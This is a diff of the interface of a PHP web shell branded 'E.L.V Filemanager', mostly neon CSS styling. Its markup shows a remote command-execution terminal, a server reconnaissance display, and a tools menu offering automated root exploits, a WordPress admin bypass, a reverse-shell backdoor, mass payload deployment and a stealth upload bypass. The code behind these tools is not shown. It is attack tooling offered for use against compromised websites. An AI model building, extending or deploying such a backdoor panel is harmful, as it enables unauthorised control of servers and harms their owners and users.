+            background-size: 200% 100%;
+            animation: divider-flow 3s linear infinite;
+            box-shadow: 0 0 15px rgba(0,229,255,0.2), 0 0 15px rgba(138,43,226,0.2);
+        }
+        .neon-divider-thin {
+            height: 2px;
+            margin: 12px 0;
+            border-radius: 1px;
+            background: linear-gradient(90deg, transparent, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), transparent);
+            opacity: 0.6;
+        }
+        @keyframes divider-flow {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+        
+        .container {
+            background: var(--bg-secondary);
+            background-image: 
+                radial-gradient(ellipse at 25% 15%, rgba(138,43,226,0.1) 0%, transparent 50%), 
+                radial-gradient(ellipse at 75% 85%, rgba(75,0,130,0.1) 0%, transparent 50%);
+            border: 1px solid var(--border-subtle); padding: 24px;
+            box-shadow: 0 0 60px rgba(138,43,226,0.15), 0 4px 20px rgba(0,0,0,0.2);
+            border-radius: 8px; margin: 0 auto; width: 100%; max-width: 1440px; position: relative; z-index: 2;
+        }
+        .header { 
+            display: flex; 
+            align-items: center; 
+            padding-bottom: 14px; 
+            margin-bottom: 14px; 
+            justify-content: space-between; 
+            flex-wrap: nowrap;
+            border-bottom: 3px solid;
+            border-image: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta)) 1;
+        }
+        .header-brand { display: flex; align-items: center; gap: 10px; }
+        .logo { width: 45px; height: 45px; border: 2px solid var(--neon-purple); border-radius: 50%; box-shadow: var(--glow-purple); }
+        .brand-text { display: flex; flex-direction: column; }
+        .brand-title { 
+            color: var(--neon-cyan); 
+            font-size: 14px; 
+            font-weight: 700; 
+            text-shadow: 0 0 3px rgba(0,229,255,0.2);
+            letter-spacing: 1px;
+            margin: 0;
+            line-height: 1.2;
+        }
+        .brand-sub { 
+            color: var(--text-secondary); 
+            letter-spacing: 2px; 
+            font-size: 10px; 
+            text-transform: uppercase; 
+            margin: 2px 0 0 0;
+        }
+        .header-actions { display:flex; gap:8px; align-items:center; }
+        .btn-logout-top { 
+            background: transparent; 
+            color: var(--neon-pink); 
+            text-decoration: none; 
+            font-weight: 700; 
+            padding: 8px 14px; 
+            border-radius: 4px; 
+            font-size: 12px; 
+            border: 2px solid var(--neon-pink-dim); 
+            box-shadow: var(--glow-pink); 
+            white-space: nowrap; 
+            transition: all 0.3s ease; 
+        }
+        .btn-logout-top:hover { 
+            background: rgba(255,20,147,0.05); 
+            box-shadow: 0 0 15px rgba(255,20,147,0.2); 
+            transform: scale(1.04); 
+            border-color: var(--neon-pink); 
+        }
+        .btn-icon-top {
+            color: var(--neon-cyan);
+            font-size: 20px;
+            text-decoration: none;
+            transition: all 0.3s;
+            padding: 6px;
+        }
+        .btn-icon-top:hover {
+            color: var(--neon-purple);
+            text-shadow: 0 0 10px rgba(138,43,226,0.4);
+            transform: scale(1.15);
+        }
+        .hud-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); 
+            gap: 10px; 
+            background: rgba(255,255,255,0.03); 
+            border: 1px solid var(--border-subtle); 
+            padding: 15px; 
+            border-radius: 6px; 
+            margin-bottom: 14px; 
+        }
+        .hud-item { 
+            background: rgba(255,255,255,0.03); 
+            padding: 8px; 
+            border: 1px solid rgba(138,43,226,0.15); 
+            border-radius: 4px; 
+            text-align: center; 
+            font-size: 11px; 
+            color: var(--text-secondary); 
+            transition: border-color 0.3s, box-shadow 0.3s; 
+        }
+        .hud-item:hover { border-color: var(--neon-purple); box-shadow: var(--glow-purple); }
+        .hud-item b { 
+            color: var(--neon-pink); 
+            display: block; 
+            margin-bottom: 3px; 
+            font-size: 11px; 
+            text-shadow: 0 0 3px rgba(255,20,147,0.2); 
+            letter-spacing: 1px; 
+        }
+        .alert { 
+            background: rgba(138,43,226,0.04); 
+            border: 1px solid var(--neon-purple-dim); 
+            color: var(--neon-purple); 
+            padding: 12px; 
+            margin-bottom: 14px; 
+            text-align: center; 
+            border-radius: 4px; 
+            font-size: 13px; 
+            box-shadow: var(--glow-purple); 
+        }
+        .elv-neon-panel { 
+            background: rgba(255,255,255,0.03); 
+            border: 1px solid var(--border-subtle); 
+            border-radius: 8px; 
+            padding: 12px; 
+            margin-bottom: 16px; 
+            box-shadow: 0 0 20px rgba(138,43,226,0.05); 
+            position: relative; 
+            overflow: hidden; 
+        }
+        .elv-neon-panel::before { 
+            content: ''; 
+            position: absolute; 
+            top: -1px; left: -1px; right: -1px; bottom: -1px; 
+            border-radius: 8px; 
+            background: linear-gradient(45deg, var(--neon-pink), var(--neon-purple), var(--neon-cyan), var(--neon-yellow), var(--neon-pink)); 
+            background-size: 400% 400%; 
+            z-index: -1; 
+            animation: border-disco 4s linear infinite; 
+            opacity: 0.12; 
+        }
+        @keyframes border-disco { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        .glass-top-icons { display: flex; justify-content: space-evenly; align-items: center; width: 100%; gap: 10px; flex-wrap: wrap; position: relative; z-index: 2; }
+        .glass-icon-btn { 
+            color: var(--neon-cyan); 
+            font-size: 36px; 
+            text-decoration: none; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            transition: all 0.3s ease; 
+            filter: drop-shadow(0 0 4px rgba(0,229,255,0.15)); 
+            cursor: pointer; 
+        }
+        .glass-icon-btn:hover { 
+            transform: scale(1.12); 
+            filter: drop-shadow(0 0 10px var(--neon-magenta)); 
+            color: var(--neon-magenta) !important; 
+        }
+        .label-txt { 
+            font-size: 10px; 
+            font-weight: 700; 
+            margin-top: 4px; 
+            color: var(--text-secondary); 
+            letter-spacing: 1.5px; 
+            text-transform: uppercase; 
+        }
+        .ascii-nav-btn { 
+            text-decoration: none; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 6px 14px; 
+            border: 2px solid var(--border-subtle); 
+            background: rgba(255,255,255,0.03); 
+            border-radius: 6px; 
+            cursor: pointer; 
+            transition: all 0.3s ease; 
+            animation: ascii-border-disco 3s linear infinite; 
+        }
+        @keyframes ascii-border-disco { 
+            0% { border-color: var(--neon-purple); box-shadow: 0 0 5px var(--neon-purple); } 
+            25% { border-color: var(--neon-pink); box-shadow: 0 0 5px var(--neon-pink); } 
+            50% { border-color: var(--neon-cyan); box-shadow: 0 0 5px var(--neon-cyan); } 
+            75% { border-color: var(--neon-magenta); box-shadow: 0 0 5px var(--neon-magenta); } 
+            100% { border-color: var(--neon-purple); box-shadow: 0 0 5px var(--neon-purple); } 
+        }
+        .ascii-nav-btn:hover { 
+            transform: scale(1.06); 
+            background: rgba(255,255,255,0.06); 
+            animation: none; 
+            border-color: var(--neon-magenta) !important; 
+            box-shadow: 0 0 15px var(--neon-magenta) !important; 
+        }
+        .ascii-nav-btn pre { 
+            margin: 0; 
+            font-size: 5px; 
+            line-height: 1.1; 
+            font-weight: 700; 
+            color: var(--neon-cyan); 
+            text-shadow: 0 0 3px rgba(0,229,255,0.2); 
+        }
+        .ascii-nav-btn div { 
+            font-size: 8px; 
+            font-weight: 700; 
+            letter-spacing: 2px; 
+            margin-top: 4px; 
+            color: var(--neon-pink); 
+            text-shadow: 0 0 3px rgba(255,20,147,0.2); 
+        }
+        .cyber-tools-interface { 
+            background: rgba(255,255,255,0.02); 
+            border: 1px solid var(--border-subtle); 
+            border-radius: 8px; 
+            padding: 16px; 
+            margin-bottom: 16px; 
+        }
+        .tools-title { 
+            color: var(--neon-purple); 
+            text-align: center; 
+            text-shadow: 0 0 4px rgba(138,43,226,0.2); 
+            letter-spacing: 3px; 
+            margin: 0 0 16px 0; 
+            font-size: 15px; 
+            font-weight: 700; 
+        }
+        .tools-grid-cyber { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; }
+        .cyber-tool-card { 
+            background: rgba(255,255,255,0.02); 
+            border: 1px solid var(--border-subtle); 
+            border-radius: 6px; 
+            padding: 12px; 
+            text-decoration: none; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            text-align: center; 
+            transition: all 0.3s ease; 
+        }
+        .cyber-tool-card:hover { 
+            border-color: var(--neon-purple); 
+            box-shadow: var(--glow-purple); 
+            transform: translateY(-3px); 
+            background: rgba(138,43,226,0.04); 
+        }
+        .icon-tool { font-size: 22px; margin-bottom: 8px; color: var(--neon-pink); text-shadow: 0 0 3px rgba(255,20,147,0.2); }
+        .tool-text-gold-wrap { 
+            background: rgba(255,255,255,0.02); 
+            border: 1px solid rgba(138,43,226,0.1); 
+            width: 100%; 
+            padding: 6px; 
+            border-radius: 4px; 
+        }
+        .tool-text-gold-wrap h3 { 
+            margin: 0 0 3px 0; 
+            font-size: 12px; 
+            color: var(--neon-pink); 
+            text-shadow: 0 0 3px rgba(255,20,147,0.2); 
+            border-bottom: 1px solid rgba(138,43,226,0.08); 
+            padding-bottom: 3px; 
+        }
+        .tool-text-gold-wrap p { margin: 0; font-size: 10px; color: var(--text-secondary); }
+        .breadcrumb { 
+            display: flex; 
+            align-items: center; 
+            background: rgba(255,255,255,0.03); 
+            padding: 10px 12px; 
+            margin-bottom: 14px; 
+            border-left: 4px solid var(--neon-cyan); 
+            overflow-x: auto; 
+            white-space: nowrap; 
+            border-radius: 4px; 
+            font-size: 14px; 
+        }
+        .home-btn { color: var(--neon-cyan); text-decoration: none; font-weight: 700; transition: all 0.3s; cursor: pointer; font-size: 14px; }
+        .home-btn:hover { color: var(--neon-purple); text-shadow: 0 0 8px rgba(138,43,226,0.25); }
+        .breadcrumb a { color: var(--text-primary); text-decoration: none; font-weight: 700; font-size: 14px; transition: color 0.2s; }
+        .breadcrumb a:hover { color: var(--neon-cyan); text-shadow: 0 0 4px rgba(0,229,255,0.2); }
+        .breadcrumb span { color: var(--text-dim); margin: 0 6px; font-size: 14px; }
+        .tools { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 14px; }
+        .neon-cyan-box { 
+            border: 1px solid var(--border-subtle); 
+            background: rgba(255,255,255,0.02); 
+            border-radius: 6px; 
+            padding: 10px; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            transition: border-color 0.3s, box-shadow 0.3s; 
+        }
+        .neon-cyan-box:hover { border-color: var(--neon-cyan); box-shadow: var(--glow-cyan); }
+        .btn-cyan-glow { 
+            background: transparent; 
+            border: 2px solid var(--neon-purple-dim); 
+            color: var(--neon-purple); 
+            font-weight: 700; 
+            box-shadow: var(--glow-purple); 
+            text-shadow: 0 0 3px rgba(138,43,226,0.2); 
+            transition: all 0.3s ease; 
+            cursor: pointer; 
+            border-radius: 4px; 
+            font-family: inherit; 
+            text-transform: uppercase; 
+            font-size: 10px; 
+            padding: 8px 12px; 
+        }
+        .btn-cyan-glow:hover { 
+            background: rgba(255,20,147,0.04); 
+            border-color: var(--neon-cyan); 
+            box-shadow: 0 0 12px var(--neon-magenta); 
+            color: #eee; 
+        }
+        .btn-gray { 
+            background: transparent; 
+            color: var(--text-secondary); 
+            border: 1px solid var(--border-subtle); 
+            font-weight: 700; 
+            border-radius: 3px; 
+            cursor: pointer; 
+            padding: 3px 6px; 
+            font-size: 10px; 
+            font-family: inherit; 
+            transition: all 0.2s; 
+        }
+        .btn-gray:hover { border-color: var(--neon-cyan); color: var(--neon-cyan); }
+        .btn-act-small { 
+            background: transparent; 
+            border: none; 
+            color: var(--text-secondary); 
+            cursor: pointer; 
+            padding: 3px; 
+            font-size: 13px; 
+            transition: 0.2s; 
+            margin: 0 2px; 
+        }
+        .btn-act-small:hover { transform: scale(1.2); }
+        .act-dl:hover { color: var(--neon-cyan); text-shadow: 0 0 5px rgba(0,229,255,0.3); }
+        .act-cp:hover { color: var(--neon-green); text-shadow: 0 0 5px rgba(0,255,136,0.3); }
+        .act-del:hover { color: var(--neon-pink); text-shadow: 0 0 5px rgba(255,20,147,0.3); }
+        .btn-editor-save { 
+            border: 2px solid var(--neon-green-dim); 
+            color: var(--neon-green); 
+            background: transparent; 
+            padding: 8px 16px; 
+            font-weight: 700; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-family: inherit; 
+            font-size: 12px; 
+            text-transform: uppercase; 
+            transition: all 0.3s; 
+        }
+        .btn-editor-save:hover { 
+            background: rgba(0,255,136,0.04); 
+            box-shadow: 0 0 12px rgba(0,255,136,0.15); 
+        }
+        .btn-editor-cancel { 
+            border: 2px solid var(--neon-pink-dim); 
+            color: var(--neon-pink); 
+            background: transparent; 
+            padding: 8px 16px; 
+            font-weight: 700; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-family: inherit; 
+            font-size: 12px; 
+            text-transform: uppercase; 
+            transition: all 0.3s; 
+            text-decoration: none; 
+            text-align: center; 
+        }
+        .btn-editor-cancel:hover { 
+            background: rgba(255,20,147,0.04); 
+            box-shadow: 0 0 12px rgba(255,20,147,0.15); 
+        }
+        input[type="file"] { 
+            background: rgba(255,255,255,0.03); 
+            border: 1px dashed var(--border-subtle); 
+            color: var(--text-primary); 
+            padding: 5px; 
+            width: 100%; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-family: inherit; 
+            font-size: 10px; 
+            outline: none; 
+        }
+        input[type="file"]::file-selector-button { 
+            background: rgba(255,255,255,0.05); 
+            border: 1px solid var(--border-subtle); 
+            color: var(--neon-purple); 
+            padding: 4px 6px; 
+            border-radius: 3px; 
+            margin-right: 6px; 
+            cursor: pointer; 
+            font-size: 10px; 
+            transition: all 0.2s; 
+        }
+        input[type="file"]::file-selector-button:hover { border-color: var(--neon-cyan); }
+        input[type="text"], input[type="number"], textarea, select { 
+            background: var(--bg-input); 
+            border: 1px solid var(--border-subtle); 
+            color: var(--text-primary); 
+            padding: 8px; 
+            width: 100%; 
+            outline: none; 
+            border-radius: 4px; 
+            font-size: 12px; 
+            font-family: inherit; 
+            transition: border-color 0.3s, box-shadow 0.3s; 
+        }
+        input[type="text"]:focus, input[type="number"]:focus, textarea:focus, select:focus { 
+            border-color: var(--neon-cyan); 
+            box-shadow: 0 0 8px rgba(0,229,255,0.1); 
+        }
+        input[name="c_perm"] { 
+            background: transparent; 
+            border: none; 
+            color: var(--neon-pink); 
+            font-weight: 700; 
+            font-size: 12px; 
+            padding: 2px; 
+            width: 36px; 
+            text-align: center; 
+        }
+        .table-responsive { 
+            width: 100%; 
+            overflow-x: auto; 
+            background: rgba(255,255,255,0.02); 
+            border: 1px solid var(--border-subtle); 
+            border-radius: 5px; 
+        }
+        table { width: 100%; border-collapse: collapse; min-width: 600px; font-size: 13px; }
+        th { 
+            text-align: left; 
+            background: rgba(255,255,255,0.04); 
+            color: var(--neon-cyan); 
+            padding: 10px 14px; 
+            font-size: 12px; 
+            text-transform: uppercase; 
+            letter-spacing: 1.5px; 
+            border-bottom: 2px solid var(--border-subtle); 
+            font-weight: 700; 
+            text-shadow: 0 0 3px rgba(0,229,255,0.15); 
+        }
+        td { padding: 8px 14px; border-bottom: 1px solid rgba(255,255,255,0.03); vertical-align: middle; color: var(--text-primary); font-size: 13px; }
+        .item-t { 
+            text-decoration: none; 
+            font-weight: 700; 
+            font-size: 15px; 
+            transition: color 0.2s, text-shadow 0.2s; 
+        }
+        .item-t[data-writable="1"] { color: var(--neon-green) !important; text-shadow: 0 0 3px rgba(0,255,136,0.2); }
+        .item-t[data-writable="0"] { color: var(--neon-pink) !important; text-shadow: 0 0 3px rgba(255,20,147,0.2); }
+        .item-t:hover { color: var(--neon-cyan) !important; text-shadow: 0 0 5px rgba(0,229,255,0.3); }
+        .dir-label { font-weight: 700; margin-right: 3px; font-size: 15px; }
+        .dir-label[data-type="dir"] { color: var(--neon-magenta); text-shadow: 0 0 3px rgba(255,0,255,0.2); }
+        .dir-label[data-type="file"] { color: var(--neon-cyan); text-shadow: 0 0 3px rgba(0,229,255,0.2); }
+        .chmod-writable { color: var(--neon-green) !important; text-shadow: 0 0 3px rgba(0,255,136,0.2); }
+        .chmod-nonwritable { color: var(--neon-pink) !important; text-shadow: 0 0 3px rgba(255,20,147,0.2); }
+        .col-size { width: 80px; color: var(--text-secondary); font-size: 12px; }
+        .col-chmod { width: 80px; font-size: 12px; }
+        .col-act { text-align: right; width: 160px; white-space: nowrap; }
+        .console { 
+            background: rgba(255,255,255,0.04); 
+            color: var(--neon-green); 
+            padding: 14px; 
+            border: 1px solid var(--border-subtle); 
+            font-size: 12px; 
+            min-height: 100px; 
+            overflow-y: auto; 
+            margin-bottom: 10px; 
+            border-top: 3px solid var(--neon-cyan); 
+            white-space: pre-wrap; 
+            border-radius: 4px; 
+            font-family: inherit;
+            text-shadow: 0 0 4px rgba(0,255,136,0.15);
+        }
+        .console pre { 
+            color: var(--neon-green); 
+            margin: 0; 
+            font-size: 12px;
+            text-shadow: 0 0 4px rgba(0,255,136,0.15);
+        }
+        .console .cmd-output { color: var(--neon-cyan); }
+        .console .cmd-prompt { color: var(--neon-magenta); font-weight: 700; }
+        
+        .cyber-term-box { 
+            background: rgba(255,255,255,0.02); 
+            border: 1px solid var(--border-subtle); 
+            border-radius: 6px; 
+            padding: 16px; 
+            display: flex; 
+            flex-direction: column; 
+        }
+        .cyber-input-wrapper { 
+            display: flex; 
+            align-items: center; 
+            background: rgba(255,255,255,0.03); 
+            border-left: 4px solid var(--neon-cyan); 
+            padding: 12px; 
+            margin-bottom: 12px; 
+            transition: border-color 0.3s; 
+        }
+        .cyber-input-wrapper:focus-within { border-left-color: var(--neon-magenta); }
+        .cyber-cmd-prompt { 
+            color: var(--neon-magenta); 
+            font-weight: 700; 
+            margin-right: 12px; 
+            text-shadow: 0 0 3px rgba(255,0,255,0.2); 
+            font-size: 14px; 
+            white-space: nowrap; 
+        }
+        .cyber-cmd-input { 
+            background: transparent !important; 
+            border: none !important; 
+            color: var(--text-primary) !important; 
+            width: 100%; 
+            font-family: inherit; 
+            font-size: 14px !important; 
+            outline: none; 
+            padding: 0 !important; 
+        }
+        .cyber-cmd-input::placeholder { color: rgba(224,224,255,0.1); }
+        .cyber-exec-btn { 
+            background: transparent; 
+            border: 2px solid var(--neon-purple-dim); 
+            color: var(--neon-purple); 
+            padding: 12px; 
+            width: 100%; 
+            font-family: inherit; 
+            font-weight: 700; 
+            font-size: 13px; 
+            text-transform: uppercase; 
+            letter-spacing: 3px; 
+            cursor: pointer; 
+            transition: all 0.3s; 
+            text-shadow: 0 0 3px rgba(138,43,226,0.2); 
+        }
+        .cyber-exec-btn:hover { 
+            background: rgba(255,20,147,0.04); 
+            color: #eee; 
+            border-color: var(--neon-magenta); 
+            box-shadow: 0 0 12px var(--neon-magenta); 
+        }
+        
+        .CodeMirror { 
+            height: auto; 
+            min-height: 400px; 
+            font-size: 12px; 
+            border-radius: 4px; 
+            border: 1px solid var(--border-subtle); 
+            font-family: 'Share Tech Mono', monospace !important; 
+        }
+        .card-autoroot { border-color: var(--neon-purple) !important; }
+        .card-recon { border-color: var(--neon-cyan) !important; }
+        .card-wpadmin { border-color: var(--neon-green) !important; }
+        .card-revshell { border-color: var(--neon-magenta) !important; }
+        .card-mass { border-color: var(--neon-yellow) !important; }
+        .card-bypass406 { border-color: var(--neon-orange) !important; }
+        
+        .glow-static { 
+            text-align: center; 
+            margin-top: 24px; 
+            padding-bottom: 16px; 
+            color: var(--text-dim); 
+            font-size: 10px; 
+        }
+        .notif-success {
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+            background: rgba(0, 255, 136, 0.05);
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            font-weight: bold;
+            text-shadow: 0 0 8px rgba(0, 255, 136, 0.5);
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.1);
+            display: block;
+        }
+        
+        @media (max-width: 600px) { 
+            .hud-grid { grid-template-columns: repeat(2, 1fr); } 
+            .tools { grid-template-columns: 1fr; } 
+            .container { padding: 10px; } 
+            .header { flex-wrap: wrap; gap: 8px; } 
+            .glass-icon-btn { font-size: 28px; } 
+            .ascii-nav-btn { padding: 4px 10px; } 
+            .ascii-nav-btn pre { font-size: 3px; } 
+        }
+        @media (min-width: 768px) { 
+            .hud-grid { grid-template-columns: repeat(4, 1fr); } 
+            .tools { grid-template-columns: repeat(3, 1fr); } 
+        }
+    </style>
 </head>
 <body>
-<canvas id="terminal-bg"></canvas>
-<div class="scanline">
-</div>
-<div class="container">
-    <div class="header">
-        <div class="header-brand"> 
-            <img src="<?= $logo_inner ?>" class="logo">
-            <div class="brand">
-<pre>
-███████╗██╗    ██╗   ██╗    ███████╗███╗   ███╗    ██╗   ██╗ ██╗██████╗     ██████╗ 
-██╔════╝██║    ██║   ██║    ██╔════╝████╗ ████║    ██║   ██║███║╚════██╗   ██╔═████╗
-█████╗  ██║    ██║   ██║    █████╗  ██╔████╔██║    ██║   ██║╚██║ █████╔╝   ██║██╔██║
-██╔══╝  ██║    ╚██╗ ██╔╝    ██╔══╝  ██║╚██╔╝██║    ╚██╗ ██╔╝ ██║ ╚═══██╗   ████╔╝██║
-███████╗███████╗╚████╔╝     ██║██╗  ██║ ╚═╝ ██║     ╚████╔╝  ██║██████╔╝██╗╚██████╔╝
-╚══════╝╚══════╝ ╚═══╝      ╚═╝╚═╝  ╚═╝     ╚═╝      ╚═══╝   ╚═╝╚═════╝ ╚═╝ ╚═════╝ ▌</pre>
-                <small>E.L.V © Filemanager v12.1 2026 ® // HxN</small>
+    <canvas id="terminal-bg"></canvas>
+    <div class="container">
+<!-- ===== HEADER ===== -->
+        <div class="header">
+            <div class="header-brand"> 
+                <div style="width:85px; height:85px; border:2px solid var(--neon-cyan); border-radius:50%; box-shadow:0 0 25px rgba(0,229,255,0.5); background:linear-gradient(135deg, #0d021a, #1a0533); display:flex; align-items:center; justify-content:center; overflow:hidden; padding:5px; flex-shrink:0;">
+                    <img src="<?= $logo_inner ?>" style="width:100%; height:100%; object-fit:contain; filter:drop-shadow(0 0 10px rgba(0,229,255,0.4));" alt="ELV">
+                </div>
+                <div class="brand-text" style="display:flex; flex-direction:column; align-items:flex-start; margin-left:8px;">
+                    <div class="brand-title" style="color:var(--neon-cyan); font-size:10px; font-weight:700; text-shadow:0 0 3px rgba(0,229,255,0.2); letter-spacing:1px; margin-bottom:2px; opacity:0.7;"> [ HxN | 2026 © ] </div>
+                    <div class="brand-sub">
+                        <img src="https://d.top4top.io/p_3839nayyc0.png" 
+                             style="height:65px; width:auto; vertical-align:middle; filter:drop-shadow(0 0 12px rgba(0,238,255,0.8)); display:inline-block;" 
+                             alt="Logo">
+                    </div>
+                </div>
+            </div>
+            <div class="header-actions">
+                <a href="?logout=1" class="btn-logout-top">LOGOUT [X]</a>
             </div>
         </div>
-        <a href="?logout=1" class="btn-logout-top">LOGOUT [X]</a>
-    </div>
-    
-    <div class="hud-grid">
-        <div class="hud-item"><b>[USER]</b><?= htmlspecialchars($u_info) ?></div>
-        <div class="hud-item"><b>[SERVER]</b><?= htmlspecialchars(substr($s_soft, 0, 25)) ?></div>
-        <div class="hud-item"><b>[IP ADDR]</b><?= htmlspecialchars($s_ip) ?></div>
-        <div class="hud-item"><b>[PHP VER]</b><?= htmlspecialchars($php_v) ?></div>
-        <div class="hud-item"><b>[KERNEL]</b><?= htmlspecialchars(substr($kernel, 0, 25)) ?></div>
-        <div class="hud-item"><b>[UUID]</b><?= htmlspecialchars($uuid) ?></div>
-        <div class="hud-item"><b>[DOC ROOT]</b><?= htmlspecialchars(substr($_SERVER['DOCUMENT_ROOT'], 0, 30)) ?></div>
-        <div class="hud-item"><b>[DISABLED]</b><?= htmlspecialchars(substr($dis_func,0,20)) ?></div>
-    </div>
-    
-    <?php if($status_msg): ?><div class="alert"><?= $status_msg ?></div><?php endif; ?>
-    
-    <div class="elv-neon-panel">
-        <div class="glass-top-icons">
-            <a href="?d=<?= urlencode($dir) ?>" class="glass-icon-btn" title="FILESYSTEM">
-                <i class="fa-regular fa-folder-open"></i>
-                <span class="label-txt">FILE</span>
-            </a>
-            <a href="?d=<?= urlencode($dir) ?>&mode=elv_tools" class="ascii-nav-btn" title="E.L.V ENGINE TOOLS">
+        
+        <!-- ===== NEON DIVIDER ===== -->
+        <div class="neon-divider"></div>
+        
+        <!-- ===== HUD GRID ===== -->
+        <div class="hud-grid">
+            <div class="hud-item"><b>[USER]</b><?= htmlspecialchars($u_info) ?></div>
+            <div class="hud-item"><b>[SERVER]</b><?= htmlspecialchars(substr($s_soft, 0, 25)) ?></div>
+            <div class="hud-item"><b>[IP ADDR]</b><?= htmlspecialchars($s_ip) ?></div>
+            <div class="hud-item"><b>[PHP VER]</b><?= htmlspecialchars($php_v) ?></div>
+            <div class="hud-item"><b>[KERNEL]</b><?= htmlspecialchars(substr($kernel, 0, 25)) ?></div>
+            <div class="hud-item"><b>[UUID]</b><?= htmlspecialchars($uuid) ?></div>
+            <div class="hud-item"><b>[DOC ROOT]</b><?= htmlspecialchars(substr($_SERVER['DOCUMENT_ROOT'], 0, 30)) ?></div>
+            <div class="hud-item"><b>[DISABLED]</b><?= htmlspecialchars(substr($dis_func,0,20)) ?></div>
+        </div>
+        
+        <?php if($status_msg): ?>
+            <div class="notif-success"><?= $status_msg ?></div>
+            <script>
+                setTimeout(function(){
+                    var notif = document.querySelector('.notif-success');
+                    if(notif) notif.style.display = 'none';
+                }, 5000);
+            </script>
+        <?php endif; ?>
+        
+        <!-- ===== NAV PANEL ===== -->
+        <div class="neon-divider-thin"></div>
+        <div class="elv-neon-panel">
+            <div class="glass-top-icons">
+                <a href="?d=<?= urlencode($dir) ?>" class="glass-icon-btn" title="FILESYSTEM">
+                    <i class="fa-regular fa-folder-open"></i>
+                    <span class="label-txt">FILE</span>
+                </a>
+                <a href="?d=<?= urlencode($dir) ?>&mode=elv_tools" class="ascii-nav-btn" title="E.L.V ENGINE TOOLS">
 <pre>
 ███████╗ ██╗      ██╗  ██╗
 ██╔════╝ ██║      ██║  ██║
@@ -1504,161 +1317,185 @@ td {
 ██╔══╝   ██║      ╚██╗██╔╝
 ███████╗ ███████╗  ╚███╔╝ 
 ╚══════╝ ╚══════╝   ╚══╝</pre>
-                <div>[ ENGINE ]</div>
-            </a>
-            <a href="?d=<?= urlencode($dir) ?>&mode=terminal" class="glass-icon-btn" title="TERMINAL">
-                <i class="fa-solid fa-terminal"></i>
-                <span class="label-txt">TERMINAL</span>
-            </a>
-        </div>
-    </div>
-    
-    <?php 
-    if(@$_GET['mode'] == 'elv_tools') { ?>
-        <div class="cyber-tools-interface">
-            <h2 class="tools-title">[ E.L.V ENGINE ® v12.1 ]</h2>
-            <div class="tools-grid-cyber">
-                <a href="?d=<?= urlencode($dir) ?>&autoroot=1" class="cyber-tool-card card-autoroot">
-                    <i class="fa-solid fa-bolt icon-tool"></i>
-                    <div class="tool-text-gold-wrap">
-                        <h3>AUTO ROOT EXPLOIT</h3>
-                        <p>Automated SUID privilege escalation scan.</p>
-                    </div>
+                    <div>[ ENGINE ]</div>
                 </a>
-                <a href="?d=<?= urlencode($dir) ?>&semiauto=1" class="cyber-tool-card card-recon">
-                    <i class="fa-solid fa-radar icon-tool"></i>
-                    <div class="tool-text-gold-wrap">
-                        <h3>SEMI AUTO RECON</h3>
-                        <p>Writable dirs & sensitive file scanner.</p>
-                    </div>
-                </a>
-                <a href="?d=<?= urlencode($dir) ?>&wpbypass=1" class="cyber-tool-card card-wpadmin">
-                    <i class="fa-brands fa-wordpress icon-tool"></i>
-                    <div class="tool-text-gold-wrap">
-                        <h3>WP ADMIN BYPASS</h3>
-                        <p>Direct access to WordPress Dashboard.</p>
-                    </div>
-                </a>
-                <a href="?d=<?= urlencode($dir) ?>&revshell=1" class="cyber-tool-card card-revshell">
-                    <i class="fa-solid fa-network-wired icon-tool"></i>
-                    <div class="tool-text-gold-wrap">
-                        <h3>REVERSE SHELL</h3>
-                        <p>Tactical backdoor connection to listener.</p>
-                    </div>
-                </a>
-                <a href="?d=<?= urlencode($dir) ?>&mode=mass" class="cyber-tool-card card-mass">
-                    <i class="fa-solid fa-truck-fast icon-tool"></i>
-                    <div class="tool-text-gold-wrap">
-                        <h3>MASS DEPLOYMENT</h3>
-                        <p>Deploy payload across multiple target sectors.</p>
-                    </div>
-                </a>
-                <a href="?d=<?= urlencode($dir) ?>&mode=bypass406" class="cyber-tool-card card-bypass406">
-                    <i class="fa-solid fa-truck-ramp-box icon-tool"></i>
-                    <div class="tool-text-gold-wrap">
-                        <h3>406 BYPASS UPLOAD</h3>
-                        <p>Stealth Base64 writer & Remote Grabber.</p>
-                    </div>
+                <a href="?d=<?= urlencode($dir) ?>&mode=terminal" class="glass-icon-btn" title="TERMINAL">
+                    <i class="fa-solid fa-terminal"></i>
+                    <span class="label-txt">TERMINAL</span>
                 </a>
             </div>
         </div>
-    <?php }
-    elseif(@$_GET['mode'] == 'terminal') { ?>
-        <div class="cyber-tools-interface">
-            <h2 class="tools-title">[ TACTICAL SYSTEM TERMINAL ]</h2>
-            <div class="cyber-term-box">
-                <form method="post" action="?d=<?= urlencode($dir) ?>&mode=terminal" style="display:flex; flex-direction:column; flex-grow:1;">
-                    <div class="cyber-input-wrapper">
-                        <span class="cyber-cmd-prompt">noname@elv:~#</span>
-                        <input type="text" name="cmd" class="cyber-cmd-input" placeholder="_type_command_here..." autofocus autocomplete="off">
-                    </div>
-                    <button type="submit" class="cyber-exec-btn">EXECUTE COMMAND</button>
-                </form>
-                <?php if ($out || isset($_POST['cmd'])): ?>
-                    <div class="console" style="margin-top:20px; max-height:400px; overflow-y:auto;">
-                        <pre><?= htmlspecialchars($out) ?></pre>
-                    </div>
-                <?php endif; ?>
-            </div>
-        </div>
-    <?php }
-     elseif(isset($_GET['autoroot']) && $_GET['autoroot'] == '1'){ ?>
